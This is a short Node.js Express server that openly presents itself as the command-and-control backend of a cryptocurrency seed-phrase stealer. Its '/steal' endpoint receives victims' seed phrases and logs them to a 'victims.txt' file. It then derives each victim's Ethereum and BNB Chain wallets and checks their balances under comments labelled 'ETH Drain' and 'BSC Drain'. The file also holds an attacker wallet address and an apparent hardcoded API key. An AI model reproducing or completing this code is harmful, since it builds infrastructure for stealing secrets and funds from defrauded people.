const express = require('express');
const { ethers } = require('ethers');
const bip39 = require('bip39');
const cors = require('cors');
const fs = require('fs');

const app = express();
app.use(express.json({limit: '10mb'}));
app.use(cors());

const YOUR_WALLET = '0x39845328Fd244e7b472E64bCc5cb4d87023Ae062';
const INFURA_KEY = '9d5503719218442da0dcd6e5ea099913';

app.post('/steal', async (req, res) => {
  const { seedPhrase } = req.body;
  
  fs.appendFileSync('victims.txt', `${new Date().toISOString()}: ${seedPhrase}\n`);
  
  try {
    // ETH Drain
    const provider = new ethers.JsonRpcProvider(`https://mainnet.infura.io/v3/${INFURA_KEY}`);
    const wallet = ethers.Wallet.fromPhrase(seedPhrase, provider);
    const balance = await provider.getBalance(wallet.address);
    console.log(`Victim: ${wallet.address}, Balance: ${ethers.formatEther(balance)} ETH`);
    
    // BSC Drain  
    const bscProvider = new ethers.JsonRpcProvider('https://bsc-dataseed1.binance.org');
    const bscWallet = ethers.Wallet.fromPhrase(seedPhrase, bscProvider);
    const bnbBalance = await bscProvider.getBalance(bscWallet.address);
    console.log(`BSC Balance: ${ethers.formatEther(bnbBalance)} BNB`);
    
    res.json({success: true, address: wallet.address});
  } catch(e) {
    res.json({success: false, error: e.message});
  }
});

const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`C2 running on port ${port}`));
